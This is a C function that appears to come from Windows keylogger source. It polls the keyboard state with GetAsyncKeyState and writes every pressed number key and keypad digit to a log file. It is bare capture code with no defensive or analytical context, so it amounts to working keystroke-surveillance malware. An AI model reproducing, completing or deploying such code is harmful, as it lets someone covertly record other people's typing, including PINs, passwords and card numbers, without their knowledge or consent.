void log_numeric_keystrokes( FILE * log_file, char * keyboard_state )
{
	int i;
	// Log the pressed numeric keys, not on the keypad 
	// (These keys can also be special keys : @,$,...)
	for( i = VK_0; i <= VK_9; i++ )
	{
		if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
		{
			int scan_code = MapVirtualKey( i, 0 );
			char ascii_char;
			// ToAscii returns a numeric key [0..9] or a special key : [@,$,%,...]
			if( ToAscii( i, scan_code, ( BYTE * ) keyboard_state, ( LPWORD ) &ascii_char, 0 ) == 1 )
			// If a character has been retrieved
			{
				log_infos( log_file, "%c", ascii_char );
			}
		}
	}
	
	// Log the pressed numeric keys, on the keypad
	for( i = VK_NUMPAD0; i <= VK_NUMPAD9; i++ )
	{
		if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
		{
			log_infos( log_file, "%01d", i - VK_NUMPAD0 );
		}
	}
}